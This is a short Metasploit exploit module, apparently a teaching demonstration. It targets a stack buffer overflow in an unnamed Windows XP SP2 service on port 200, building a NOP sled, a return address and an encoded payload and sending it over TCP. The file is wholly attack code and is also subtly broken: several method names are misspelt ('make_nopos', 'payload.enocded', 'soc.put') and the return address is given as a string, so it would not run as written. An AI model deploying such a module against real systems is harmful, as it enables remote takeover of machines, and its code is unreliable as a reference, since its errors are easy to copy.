class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
     'Name'          => 'Stack Based Buffer Over Flow',
     'Description'   =>  %q{
     Demonstration of Simple Stack BOF
     },
     'Platform'        => 'Win',
     'Author'          => 'Mohd Samiuzzaman',
     'Payload'         =>
     {
       'space'   => 1000,
       'Badchars' => "\x00\x0a\x0d\x20",
       },
       'Targets' => 
       [
                    ['Windows XP SP2',{ 'Ret' => '0X71AB9372', 'Offset' => 520,}]       ],
       'DisclouserDate' => '2019'
                     ))
    register_options(
      [
        Opt::RPORT(200)
      ])
  end
  def exploit 
      connect 
      buf = make_nops(target['Offset'])
      buf = buf + [target['Ret']].pack('V') + make_nopos(30) + payload.enocded
      soc.put(buf)
      handler
      disconnect
      end
end




       
  
